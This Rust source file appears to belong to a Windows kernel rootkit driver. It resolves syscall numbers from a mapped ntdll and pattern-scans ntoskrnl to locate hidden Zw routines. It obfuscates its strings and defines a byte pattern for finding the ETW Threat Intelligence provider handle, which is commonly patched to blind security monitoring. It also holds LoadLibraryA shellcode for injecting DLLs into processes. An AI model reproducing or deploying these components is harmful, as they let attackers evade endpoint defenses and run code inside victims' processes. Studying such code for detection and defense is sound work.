use obfstr::obfstr;
use core::{
    ffi::{c_void, CStr},
    ptr::{null_mut, read},
    slice::from_raw_parts,
};

use wdk_sys::{
    *,
    _SECTION_INHERIT::ViewUnmap,
    ntddk::{
        ZwClose, ZwMapViewOfSection, 
        ZwOpenSection, ZwUnmapViewOfSection
    },
};

use {
    super::{
        address::get_module_base_address, 
        InitializeObjectAttributes
    },
    crate::{
        data::{
            IMAGE_DOS_HEADER, 
            IMAGE_EXPORT_DIRECTORY, 
            IMAGE_NT_HEADERS, 
            IMAGE_SECTION_HEADER,
        },
        error::ShadowError, 
        utils::uni, Result
    },
};

/// Scans memory for a specific pattern of bytes in a specific section.
///
/// # Arguments
///
/// * `function_address` - The base address (in `usize` format) from which the scan should start.
/// * `pattern` - A slice of bytes (`&[u8]`) that represents the pattern you are searching for in memory.
/// * `offset` - Offset from the pattern position where the i32 value starts.
/// * `final_offset` - The final offset applied to the resulting address.
/// * `size` - The size of the memory to scan.
///
/// # Returns
///
/// * `Ok(*mut u8)` - The computed address after applying offsets and the found i32.
/// * `Err(ShadowError)` - Error if pattern not found or conversion fails.
pub unsafe fn scan_for_pattern(
    function_address: *mut c_void,
    pattern: &[u8],
    offset: usize,
    final_offset: isize,
    size: usize,
) -> Result<*mut u8> {
    let function_bytes = from_raw_parts(function_address as *const u8, size);

    if let Some(x) = function_bytes.windows(pattern.len()).position(|window| window == pattern) {
        let position = x + offset;

        // Converting the slice starting at the position to i32 (little-endian)
        let offset_bytes = &function_bytes[position..position + 4];
        let offset = i32::from_le_bytes(
            offset_bytes
                .try_into()
                .map_err(|_| ShadowError::PatternNotFound)?,
        );

        // Calculating the final address
        let address = function_address.cast::<u8>().add(x);
        let next_address = address.offset(final_offset);

        // Returning the final address adjusted by the found offset
        Ok(next_address.offset(offset as isize))
    } else {
        Err(ShadowError::PatternNotFound)
    }
}

/// Retrieves the syscall index for a given function name.
///
/// # Arguments
///
/// * `function_name` - A string slice representing the name of the function for which to retrieve the syscall index.
///
/// # Returns
///
/// * `Ok(u16)` - Returns the syscall index (`u16`) if the function is found.
/// * `Err(ShadowError)` - Returns an error if the function is not found or if a system API call fails.
pub unsafe fn get_syscall_index(function_name: &str) -> Result<u16> {
    let mut section_handle = null_mut();
    let dll = uni::str_to_unicode(obfstr!("\\KnownDlls\\ntdll.dll"));
    let mut obj_attr = InitializeObjectAttributes(
        Some(&mut dll.to_unicode()),
        OBJ_CASE_INSENSITIVE,
        None,
        None,
        None,
    );

    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
    if !NT_SUCCESS(status) {
        return Err(ShadowError::ApiCallFailed("ZwOpenSection", status));
    }

    // Map ntdll.dll to memory and retrieve the address
    let mut large = core::mem::zeroed::<LARGE_INTEGER>();
    let mut ntdll_addr = null_mut();
    let mut view_size = 0;
    status = ZwMapViewOfSection(
        section_handle,
        -1isize as HANDLE,
        &mut ntdll_addr,
        0,
        0,
        &mut large,
        &mut view_size,
        ViewUnmap,
        0,
        PAGE_READONLY,
    );

    if !NT_SUCCESS(status) {
        ZwClose(section_handle);
        return Err(ShadowError::ApiCallFailed("ZwMapViewOfSection", status));
    }

    // Locate export directory, names, and functions for syscall extraction
    let dos_header = ntdll_addr as *const IMAGE_DOS_HEADER;
    let nt_header = (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
    let ntdll_addr = ntdll_addr as usize;

    // Retrieves the size of the export table
    let export_directory = (ntdll_addr + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
        as *const IMAGE_EXPORT_DIRECTORY;

    // Retrieving information from module names
    let names = from_raw_parts(
        (ntdll_addr + (*export_directory).AddressOfNames as usize) as *const u32,
        (*export_directory).NumberOfNames as usize,
    );

    // Retrieving information from functions
    let functions = from_raw_parts(
        (ntdll_addr + (*export_directory).AddressOfFunctions as usize) as *const u32,
        (*export_directory).NumberOfFunctions as usize,
    );

    // Retrieving information from ordinals
    let ordinals = from_raw_parts(
        (ntdll_addr + (*export_directory).AddressOfNameOrdinals as usize) as *const u16,
        (*export_directory).NumberOfNames as usize,
    );

    // Search for the function by name and extract the syscall number (SSN)
    for i in 0..(*export_directory).NumberOfNames as isize {
        let ordinal = ordinals[i as usize] as usize;
        let address = (ntdll_addr + functions[ordinal] as usize) as *const u8;
        let name = CStr::from_ptr((ntdll_addr + names[i as usize] as usize) as *const i8)
            .to_str()
            .map_err(|_| ShadowError::StringConversionFailed(names[i as usize] as usize))?;

        if name == function_name
            && read(address) == 0x4C
            && read(address.add(1)) == 0x8B
            && read(address.add(2)) == 0xD1
            && read(address.add(3)) == 0xB8
            && read(address.add(6)) == 0x00
            && read(address.add(7)) == 0x00
        {
            let high = read(address.add(5)) as u16;
            let low = read(address.add(4)) as u16;
            let ssn = (high << 8) | low;

            ZwUnmapViewOfSection(-1isize as HANDLE, ntdll_addr as *mut c_void);
            ZwClose(section_handle);
            return Ok(ssn);
        }
    }

    // Cleanup
    ZwUnmapViewOfSection(-1isize as HANDLE, ntdll_addr as *mut c_void);
    ZwClose(section_handle);

    Err(ShadowError::FunctionExecutionFailed("get_syscall_index", line!()))
}

/// Finds the address of a specified Zw function by scanning the system kernel's `.text` section.
///
/// # Arguments
///
/// * `name` - The name of the Zw function to find.
///
/// # Returns
///
/// * `Ok(usize)` - Returns the address of the Zw function (`usize`) if found.
/// * `Err(ShadowError)` - Returns an error if the function is not found or a system error occurs.
///    It should be used with caution in kernel mode to prevent system instability.
pub unsafe fn find_zw_function(name: &str) -> Result<usize> {
    let ssn = get_syscall_index(name)?;
    let ntoskrnl_addr = get_module_base_address(obfstr!("ntoskrnl.exe"))?;

    let ssn_bytes = ssn.to_le_bytes();
    ZW_PATTERN[21] = ssn_bytes[0];
    ZW_PATTERN[22] = ssn_bytes[1];

    let dos_header = ntoskrnl_addr as *const IMAGE_DOS_HEADER;
    let nt_header = (ntoskrnl_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;

    // Scan the `.text` section for the matching pattern
    for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
        let section = (*section_header.add(i)).Name;
        let name = core::str::from_utf8(&section).unwrap().trim_matches('\0');

        if name == obfstr!(".text") {
            let text_start = ntoskrnl_addr as usize + (*section_header.add(i)).VirtualAddress as usize;
            let text_end = text_start + (*section_header.add(i)).Misc.VirtualSize as usize;
            let data = core::slice::from_raw_parts(text_start as *const u8, text_end - text_start);

            // Search for the Zw function by matching the pattern
            if let Some(offset) = data.windows(ZW_PATTERN.len()).position(|window| {
                window
                    .iter()
                    .zip(&ZW_PATTERN[..])
                    .all(|(d, p)| *p == 0xCC || *d == *p)
            }) {
                return Ok(text_start + offset);
            }
        }
    }

    Err(ShadowError::FunctionExecutionFailed("find_zw_function", line!()))
}

/// The `ETWTI_PATTERN` represents a sequence of machine instructions used for
/// identifying the location of the `EtwThreatIntProvRegHandle` in memory.
pub const ETWTI_PATTERN: [u8; 5] = [
    0x33, 0xD2, // 33d2           xor  edx,edx
    0x48, 0x8B,
    0x0D, // 488b0dcd849300  mov  rcx,qword ptr [nt!EtwThreatIntProvRegHandle (xxxx)]
];

/// The `ZW_PATTERN` represents a sequence of machine instructions used for
/// identifying system service routines within the Windows kernel.
pub static mut ZW_PATTERN: [u8; 30] = [
    0x48, 0x8B, 0xC4, // mov rax, rsp
    0xFA, // cli
    0x48, 0x83, 0xEC, 0x10, // sub rsp, 10h
    0x50, // push rax
    0x9C, // pushfq
    0x6A, 0x10, // push 10h
    0x48, 0x8D, 0x05, 0xCC, 0xCC, 0xCC, 0xCC, // lea rax, KiServiceLinkage
    0x50, // push rax
    0xB8, 0xCC, 0xCC, 0xCC, 0xCC, // mov eax, <SSN>
    0xE9, 0xCC, 0xCC, 0xCC, 0xCC, // jmp KiServiceInternal
];

pub static mut LDR_SHELLCODE: [u8; 31] = [
    0x48, 0x83, 0xEC, 0x28,                                      // sub rsp, 0x28
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, LoadLibraryA
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rcx, &DllPath
    0xFF, 0xD0,                                                  // call rax
    0x48, 0x83, 0xC4, 0x28,                                      // add rsp, 0x28
    0xC3                                                         // ret
];